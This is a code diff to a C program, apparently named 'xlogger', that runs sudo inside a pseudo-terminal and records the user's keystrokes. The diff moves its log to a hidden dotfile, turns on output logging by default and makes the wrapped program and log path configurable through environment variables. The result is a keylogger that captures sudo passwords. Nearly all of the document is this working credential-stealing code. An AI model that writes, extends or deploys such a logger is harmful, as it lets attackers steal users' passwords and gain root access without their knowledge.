@@ -20,8 +20,8 @@
 #include <termios.h>
 #include <util.h>
 
-#define TARGET_PROGRAM "/usr/bin/sudo"
-#define LOG_FILE "/tmp/xlogger.log"
+#define DEFAULT_TARGET_PROGRAM "/usr/bin/sudo"
+#define DEFAULT_LOG_FILE ".xlogger.log"
 #define BUFFER_SIZE 4096
 #define INPUT_LINE_BUFFER_SIZE 1024
 
@@ -29,13 +29,14 @@
 // 是否记录键盘 默认记录
 static int log_keyboard_input = 1;
 
-// 是否记录终端的输出 默认不记录
-static int log_console_output = 0;
+// 是否记录终端的输出 默认记录
+static int log_console_output = 1;
 
 static struct termios original_termios;
 static int master_fd = -1;
 static FILE *log_fp = NULL;
 static pid_t child_pid = -1;
+static const char *target_program = NULL;
 static char input_line_buffer[INPUT_LINE_BUFFER_SIZE];
 static size_t input_line_pos = 0;
 
@@ -189,7 +190,7 @@ int create_pty_and_fork(char **argv) {
             _exit(1);
         }
         
-        execv(TARGET_PROGRAM, argv);
+        execv(target_program, argv);
         perror("execv");
         _exit(1);
     }
@@ -246,7 +247,25 @@ void io_loop(void) {
 int main(int argc, char *argv[]) {
     int status;
     
-    log_fp = fopen(LOG_FILE, "a");
+    target_program = getenv("XPROGRAM");
+    if (!target_program || !*target_program)
+        target_program = DEFAULT_TARGET_PROGRAM;
+
+    {
+        const char *log_input = getenv("XLOGINPUT");
+        if (log_input && *log_input)
+            log_keyboard_input = atoi(log_input);
+
+        const char *log_output = getenv("XLOGOUTPUT");
+        if (log_output && *log_output)
+            log_console_output = atoi(log_output);
+    }
+    
+    const char *log_file = getenv("XLOGFILE");
+    if (!log_file || !*log_file)
+        log_file = DEFAULT_LOG_FILE;
+    
+    log_fp = fopen(log_file, "a");
     if (!log_fp) {
         perror("fopen log file");
         return 1;
@@ -265,7 +284,7 @@ int main(int argc, char *argv[]) {
         return 1;
     }
     
-    fprintf(log_fp, "\n=== New session started: %s ===\n", TARGET_PROGRAM);
+    fprintf(log_fp, "\n=== New session started: %s ===\n", target_program);
     for (int i = 1; i < argc; i++) {
         fprintf(log_fp, "Arg[%d]: %s\n", i, argv[i]);
     }
